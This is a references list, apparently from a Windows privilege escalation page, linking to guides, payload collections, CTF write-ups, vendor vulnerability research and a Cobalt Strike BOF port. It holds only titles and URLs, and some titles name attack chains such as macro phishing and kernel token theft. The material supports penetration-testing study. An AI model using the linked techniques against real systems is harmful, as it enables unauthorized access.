- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing SMTP üzerinden → hMailServer credential decryption → Veeam CVE-2023-27532 ile SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Kernel Gölgesinde Kedi & Fare](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – SCADA Sisteminde Bulunan Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Windows'ta Symbolic Links'in Kötüye Kullanımı](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
